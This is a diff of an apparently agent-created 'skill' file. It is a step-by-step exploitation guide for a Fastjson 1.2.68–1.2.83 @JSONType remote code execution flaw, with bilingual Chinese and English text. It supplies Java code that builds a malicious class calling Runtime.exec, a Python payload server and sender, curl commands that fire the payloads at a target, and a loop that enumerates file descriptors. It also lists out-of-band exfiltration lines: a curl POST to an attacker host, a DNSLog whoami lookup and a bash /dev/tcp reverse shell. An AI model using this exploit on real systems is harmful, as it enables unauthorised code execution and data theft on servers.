@@ -1,58 +1,58 @@
 ---
 name: "fastjson-jsontype-rce"
-description: "Fastjson 1.2.66-1.2.83 @JSONType RCE  JDK + Python  + Maven Central  ASM"
+description: "Fastjson 1.2.68-1.2.83 @JSONType RCE。自包含，不依赖外部工具仓库。只需 JDK + Python 标准库 + Maven Central 的 ASM。"
 agent_created: true
 ---
 
-# Fastjson 1.2.66-1.2.83 @JSONType RCE
+# Fastjson 1.2.68-1.2.83 @JSONType RCE
 
- skill Maven Central  `org.ow2.asm`Java Spring/Hibernate 
+自包含 skill：所有利用代码内嵌，唯一外部依赖是 Maven Central 的 `org.ow2.asm`（Java 字节码库，Spring/Hibernate 间接依赖，不会消失）。
 
 ---
 
-## 
+## 漏洞摘要
 
-|  |  |
+| 字段 | 值 |
 |------|-----|
-|  | QVD-2026-43021 |
-|  | Fastjson 1.2.66  1.2.83 |
-|  | Spring Boot FatJar / SafeMode=false / Linux |
-| JDK | 8  RCE11/17/21  fd  |
+| 编号 | QVD-2026-43021 |
+| 影响 | Fastjson **1.2.68 – 1.2.83** |
+| 前提 | Spring Boot FatJar / SafeMode=false（默认） / Linux |
+| JDK | 8 直接 RCE；11/17/21 需 fd 枚举 |
 
-`checkAutoType`  `getResourceAsStream`  `@type`  `.``/`  URL `@JSONType`  class 
+`checkAutoType` 中 `getResourceAsStream` 将 `@type` 经 `.`→`/` 变为 URL，从攻击端下载带 `@JSONType` 的恶意 class 并加载。
 
 ---
 
-## 
+## 检测
 
 ```bash
-#  "autoType is not support"  Fastjson 1.2.68+
+# 指纹：报错含 "autoType is not support" → Fastjson 1.2.68+
 curl -X POST TARGET_URL -H "Content-Type: application/json" \
   -d '{"@type":"java.lang.AutoCloseable","x":1}'
 
-# DNSLog 
+# DNSLog 确认出网
 curl -X POST TARGET_URL -H "Content-Type: application/json" \
   -d '{"@type":"java.net.Inet4Address","val":"YOUR.dnslog.cn"}'
 
-# SafeMode 
+# SafeMode 检查
 curl TARGET_URL/info 2>/dev/null | grep -i safeMode
-# safeMode=true  false  
+# safeMode=true → 免疫。false → 继续。
 ```
 
 ---
 
-## 
+## 利用
 
-### 
+### 准备
 
 ```bash
 mkdir -p lib stage
 curl -o lib/asm-9.6.jar https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar
 ```
 
-### PayloadKit.java
+### 第一步：PayloadKit.java
 
- `PayloadKit.java` `stage/`  class 
+保存为 `PayloadKit.java`，编译并运行以在 `stage/` 目录生成恶意 class 文件。
 
 ```java
 import org.objectweb.asm.*;
@@ -91,7 +91,7 @@ public class PayloadKit {
         else                   kit.writeDirect();
     }
 
-    // ---- JDK 8  class ----
+    // ---- JDK 8: single .class ----
     void writeDirect() throws Exception {
         String label = "D" + randomHex(6);
         String fqcn  = "http." + peerAddr + "." + peerPort + "." + label;
@@ -120,7 +120,7 @@ public class PayloadKit {
         System.out.println("stage/" + jarName + " + stage/slots/3..255/*.class");
     }
 
-    // ---- entry ----
+    // ---- bytecode ----
     byte[] assemble(String fqcn, String cmd) {
         ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
         String path = fqcn.replace('.', '/');
@@ -128,12 +128,12 @@ public class PayloadKit {
         cw.visit(Opcodes.V1_6, Opcodes.ACC_PUBLIC, path, null,
                  "java/lang/Object", null);
 
-        //  @JSONType   Fastjson ""
+        // Attach @JSONType so Fastjson trusts this class
         AnnotationVisitor ann = cw.visitAnnotation(
             "Lcom/alibaba/fastjson/annotation/JSONType;", true);
         ann.visitEnd();
 
-        // <clinit>  Runtime.exec(new String[]{"/bin/sh","-c",cmd})
+        // <clinit> calls Runtime.exec
         MethodVisitor mv = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
         mv.visitCode();
 
@@ -173,7 +173,6 @@ public class PayloadKit {
             zip.putNextEntry(new ZipEntry(fqcn.replace('.', '/') + ".class"));
             zip.write(cls);
             zip.closeEntry();
-            // manifest
             zip.putNextEntry(new ZipEntry("META-INF/MANIFEST.MF"));
             zip.write("Manifest-Version: 1.0\n".getBytes());
             zip.closeEntry();
@@ -199,19 +198,19 @@ public class PayloadKit {
 }
 ```
 
-### 
+### 第二步：编译
 
 ```bash
 javac -cp lib/asm-9.6.jar PayloadKit.java
 ```
 
-### dispatch.py
+### 第三步：dispatch.py
 
- `dispatch.py` HTTP  `stage/`  payload 
+保存为 `dispatch.py`，起 HTTP 托管 `stage/` 目录，构造 payload 发送到目标。
 
 ```python
 #!/usr/bin/env python3
-"""Fastjson @JSONType RCE   HTTP  + payload """
+"""Fastjson @JSONType RCE — pure stdlib HTTP server + payload sender."""
 import sys, json, time, struct, socket, threading, os
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 
@@ -227,7 +226,7 @@ def guess_label():
     """Scan stage/ for the generated label."""
     for f in os.listdir('stage'):
         if f.endswith('.class') and len(f) > 7:
-            return f[:-6]  # strip .class
+            return f[:-6]
         if f.startswith('bundle_') and f.endswith('.jar'):
             return f[7:-4]
     return None
@@ -246,11 +245,10 @@ def fire():
     import urllib.request
     label = guess_label()
     if not label:
-        print('[-] no label found in stage/  run PayloadKit first')
+        print('[-] no label found in stage/ — run PayloadKit first')
         return
 
     if MODE == 'fd':
-        # 255-element array for fd enumeration
         parts = [{
             "@type": f"jar:http:..{IP_INT}:{BIND_PORT}.bundle_{label}!.seed.{label}_Boot"
         }]
@@ -280,29 +278,29 @@ if __name__ == '__main__':
     time.sleep(45)
 ```
 
-### 
+### 第四步：执行
 
 ```bash
-#  stage/  class 
+# 生成 stage/ 下的 class 文件
 java -cp .:lib/asm-9.6.jar PayloadKit <ATTACKER_IP> <PORT> "id" direct   # JDK 8
 java -cp .:lib/asm-9.6.jar PayloadKit <ATTACKER_IP> <PORT> "id" fd       # JDK 11+
 
-# 
+# 发起攻击
 python3 dispatch.py <ATTACKER_IP> <PORT> TARGET_URL /parse direct
 python3 dispatch.py <ATTACKER_IP> <PORT> TARGET_URL /parse fd
 ```
 
-###  curl Python
+### 只用 curl（不跑 Python）
 
 ```bash
-#  HTTP 
+# 先手动起 HTTP 服务
 cd stage && python3 -m http.server <PORT> &
 
 # JDK 8
 curl -X POST TARGET_URL -H "Content-Type: application/json" \
   -d '{"@type":"jar:http:..INT_IP:PORT.LABEL!.http.INT_IP.PORT.LABEL","x":1}'
 
-# JDK 17/21   fd
+# JDK 17/21 — 逐个试 fd
 for slot in $(seq 3 255); do
   curl -X POST TARGET_URL -H "Content-Type: application/json" \
     -d "[{\"@type\":\"jar:http:..INT_IP:PORT.bundle_LABEL!.seed.LABEL_Boot\"},{\"@type\":\"jar:file:.proc.self.fd.$slot!.slot$slot.LABEL_S$slot\"}]"
@@ -311,17 +309,17 @@ done
 
 ---
 
-## Payload 
+## Payload 速查
 
-|  | Payload  |
+| 用途 | Payload 模板 |
 |------|-------------|
-|  | `{"@type":"java.lang.AutoCloseable","x":1}` |
+| 指纹 | `{"@type":"java.lang.AutoCloseable","x":1}` |
 | DNSLog | `{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}` |
-| JDK 8 SSRF  | `{"@type":"http:..INT_IP:PORT.X"}` |
+| JDK 8 SSRF 确认 | `{"@type":"http:..INT_IP:PORT.X"}` |
 | JDK 8 RCE | `{"@type":"jar:http:..INT_IP:PORT.LABEL!.http.INT_IP.PORT.LABEL","x":1}` |
-| JDK 17/21 RCE |  255  `jar:file:.proc.self.fd.N!.slotN.LABEL_SN` |
+| JDK 17/21 RCE | 数组 255 元素，逐个 `jar:file:.proc.self.fd.N!.slotN.LABEL_SN` |
 
-**IP ** `replace('.','/')`  URL
+**IP 整数化**：避免 `replace('.','/')` 破坏 URL。
 
 ```python
 python3 -c "import socket,struct; print(struct.unpack('!I',socket.inet_aton('IP'))[0])"
@@ -329,19 +327,19 @@ python3 -c "import socket,struct; print(struct.unpack('!I',socket.inet_aton('IP'
 
 ---
 
-## 
+## 回显
 
- HTTP  OOB
+不支持 HTTP 响应回显，需 OOB：
 
-- **HTTP ** `| curl -X POST --data-binary @- http://ATTACKER:PORT/out`
-- **DNSLog**`nslookup $(whoami).xxx.dnslog.cn`
-- ** Shell**`bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
+- **HTTP 反连**：命令尾追加 `| curl -X POST --data-binary @- http://ATTACKER:PORT/out`
+- **DNSLog**：`nslookup $(whoami).xxx.dnslog.cn`
+- **反弹 Shell**：`bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
 
 ---
 
-## 
+## 注意事项
 
-- `..`  `replace('.','/')`  `//`
-- FatJar  `@type="http:..INT_IP:PORT.X"`  GET    WAR 
-- Windows  fd  `/proc/self/fd`
--  `/bin/sh -c` Linux/macOS
+- `..` 双点经 `replace('.','/')` 变为 `//`
+- FatJar 确认：发 `@type="http:..INT_IP:PORT.X"` 看攻击端收到 GET → 可打。没收到 → WAR 部署，停止
+- Windows 不支持 fd 链（无 `/proc/self/fd`）
+- 命令默认 `/bin/sh -c`，仅 Linux/macOS
